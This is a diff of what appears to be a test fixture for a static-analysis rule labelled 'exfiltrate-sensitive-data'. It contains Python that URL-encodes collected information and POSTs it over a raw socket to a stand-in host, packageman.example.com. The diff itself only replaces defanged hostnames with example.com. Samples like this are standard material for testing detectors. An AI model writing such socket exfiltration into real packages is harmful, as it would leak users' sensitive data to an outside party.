@@ -68,12 +68,12 @@ for i in xrange(0, len(info)):
     else:
         posty += "%%%02X" % ord(info[i])
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("packageman.DEFANGED.com", 80))
+s.connect(("packageman.example.com", 80))
 # ruleid: exfiltrate-sensitive-data
 s.send(
     "POST / HTTP/1.1\r\n"
     + "User-Agent: Python\r\n"
-    + "Host: DEFANGED.DEFANGED.com\r\n"
+    + "Host: DEFANGED.example.com\r\n"
     + "Content-Type: application/x-www-form-urlencoded\r\n"
     + "Content-Length: "
     + str(len(posty))
